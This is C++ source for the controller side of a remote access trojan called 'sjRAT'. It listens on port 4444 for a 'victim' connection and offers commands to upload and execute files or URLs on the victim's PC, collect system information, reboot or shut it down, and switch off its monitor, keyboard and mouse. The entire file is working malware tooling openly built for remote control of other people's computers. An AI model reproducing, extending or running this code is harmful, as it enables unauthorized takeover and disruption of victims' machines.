#include <WinSock2.h>
#include <WS2tcpip.h>
#include <Windows.h>
#include <iostream>
#include <fstream>
#include <stdexcept>
#include <stdio.h>
#include <string.h>
#include <tchar.h>
#include <chrono>
#include <mmsystem.h>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "Ws2_32.lib")

void SendAndReceive(SOCKET client, std::string command)
{
    send(client, command.c_str(), command.size(), 0);
    char buff[1024];
    int bytesReceived = recv(client, buff, sizeof(buff), 0);
    if (bytesReceived > 0) {
        buff[bytesReceived] = '\0';
        printf("[*] %s\n", buff);
    }
}

void help_menu()
{
    printf("==============HELP-MENU==============\n");
    printf("sysinfo - see information about victim's PC\n\n");
    printf("msgbox - summon MessageBox on victim's PC\n\n");
    printf("upload <file> - send file to victim's PC\n\n");
    printf("execute <file/url> - lauch file or open url\n\n");
    printf("reboot - reboot victim's PC\n\n");
    printf("shutdown - turn off victim's PC\n\n");
    printf("ping - show latency\n\n");
    printf("monitor off/on - turn off/on victim's monitor\n\n");
    printf("input off/on - disable/enable keyboard and mouse input\n\n");
    printf("play <file> - play music from file\n\n");
    printf("help - see this message\n\n");
    printf("exit - exit sjRAT and terminate client session\n\n");
    printf("=====================================\n");
}

void SendFile(SOCKET client, const std::string& filePath)
{
    std::ifstream file(filePath, std::ios::binary | std::ios::ate);
    if (!file.is_open())
    {
        printf("Failed to open file\n");
        return;
    }

    std::streampos fileSize = file.tellg();
    file.seekg(0, std::ios::beg);

    std::string fileSizeStr = std::to_string(fileSize);

    send(client, fileSizeStr.c_str(), fileSizeStr.size(), 0);
    Sleep(500);

    char buffer[1024];
    int bytesRead = 0;
    while (bytesRead < fileSize)
    {
        int remainingBytes = fileSize - bytesRead;
        int bytesToRead = remainingBytes < 1024 ? remainingBytes : 1024;
        file.read(buffer, bytesToRead);
        int bytesSent = send(client, buffer, bytesToRead, 0);
        if (bytesSent == SOCKET_ERROR)
        {
            printf("Error sending file\n");
            return;
        }
        bytesRead += bytesSent;
    }

    file.close();

    char response[1024];
    int bytesReceived = recv(client, response, sizeof(response), 0);
    if (bytesReceived > 0)
    {
        response[bytesReceived] = '\0';
        printf("[*] %s\n", response);
    }
}

void MeasurePingTime(SOCKET client)
{
    // Отправляем текущее время клиенту
    auto start = std::chrono::high_resolution_clock::now();
    send(client, reinterpret_cast<char*>(&start), sizeof(start), 0);

    // Получаем время отклика от клиента
    std::chrono::high_resolution_clock::time_point end;
    int bytesReceived = recv(client, reinterpret_cast<char*>(&end), sizeof(end), 0);
    if (bytesReceived == sizeof(end)) {
        // Вычисляем время отклика
        auto duration = std::chrono::duration_cast<std::chrono::microseconds>(end - start);
        double pingTime = duration.count() / 1000.0;  // Конвертируем в миллисекунды
        printf("[*] Ping time: %.2f ms\n", pingTime);
    }
    else {
        printf("Failed to measure ping time\n");
    }
}

int main(int argc, char* argv[])
{
    char ip_addr[] = "192.168.31.135";
    int port = 4444;

    // Startup WinSock
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    WSADATA wsaData;
    WORD DllVersion = MAKEWORD(2, 1);
    if (WSAStartup(DllVersion, &wsaData) != 0)
    {
        printf("WinSock startup failed\n");
        exit(1);
    }

    SOCKADDR_IN addr;
    int sizeofaddr = sizeof(addr);
    addr.sin_addr.s_addr = htonl(INADDR_ANY); // to public connections | inet_addr("127.0.0.1") <- connections only from local network
    // addr.sin_addr.s_addr = inet_addr(ip_addr);
    addr.sin_port = htons(port); // port
    addr.sin_family = AF_INET; // IPv4

    SOCKET sListen = socket(AF_INET, SOCK_STREAM, NULL); // socket that listens for connetions
    bind(sListen, (SOCKADDR*)&addr, sizeof(addr)); // bind address to the socket
    printf("[*] Listening for connections...\n");
    listen(sListen, SOMAXCONN); // start listen for connections

    SOCKET client;
    client = accept(sListen, (SOCKADDR*)&addr, &sizeofaddr); // accept client connection
    if (client == 0)
    {
        printf("Failed to accept client's connection\n%d\n", WSAGetLastError());
        exit(1);
    } else {
        // Get connected client IP
        struct sockaddr_in addr_in;
        int addrSize = sizeof(addr_in);
        getpeername(client, (struct sockaddr*)&addr_in, &addrSize);
        const char* clientIP = inet_ntoa(addr_in.sin_addr);
        printf("[+] New connection from %s!\n", clientIP);
        
        bool clientConnected = true;

        std::string command;
        while (true) 
        {
            std::cout << "sj> ";
            std::getline(std::cin, command);

            if (command == "msgbox") {
                SendAndReceive(client, command);
            }
            else if (command == "sysinfo" || command == "systeminfo" || command == "info") {
                SendAndReceive(client, command);
            }
            else if (command.substr(0, 6) == "upload") {
                std::string filePath = command.substr(7);
                SendFile(client, filePath);
            }
            else if (command.substr(0, 7) == "execute") {
                SendAndReceive(client, command);
            }
            else if (command == "shutdown") {
                SendAndReceive(client, command);
            }
            else if (command == "reboot") {
                SendAndReceive(client, command);
            }
            else if (command == "ping") {
                MeasurePingTime(client);
            }
            else if (command.substr(0, 5) == "input") {
                std::string state = command.substr(6);
                if (state == "on") {
                    SendAndReceive(client, command);
                } else if (state == "off") {
                    SendAndReceive(client, command);
                } else {
                    printf("[!] Usage: input off/on\n");
                }
            }
            else if (command.substr(0, 7) == "monitor") {
                std::string state = command.substr(8);
                if (state == "on") {
                    SendAndReceive(client, command);
                } else if (state == "off") {
                    SendAndReceive(client, command);
                } else {
                    printf("[!] Usage: monitor off/on\n");
                }
            }

            else if (command == "help") {
                help_menu();
            }
            else if (command == "exit" || command == "quit" || command == "bye") {
                SendAndReceive(client, command.c_str());
                closesocket(client);
                clientConnected = false;
                system("pause");
                exit(0);
            }
        }
    }

    system("pause");
}